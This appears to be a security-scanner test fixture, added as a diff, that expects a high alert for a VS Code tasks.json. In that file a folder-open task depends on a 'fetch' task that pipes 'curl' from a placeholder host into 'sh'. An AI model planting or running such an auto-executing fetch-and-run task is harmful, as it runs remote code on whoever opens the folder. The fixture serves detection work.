@@ -1,0 +1,10 @@
+Folder-open task that only depends on a malicious task.
+alert: high
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {"label": "fetch", "type": "shell", "command": "curl -s https://example.invalid/x | sh"},
+    {"label": "open", "dependsOn": ["fetch"], "runOptions": {"runOn": "folderOpen"}}
+  ]
+}
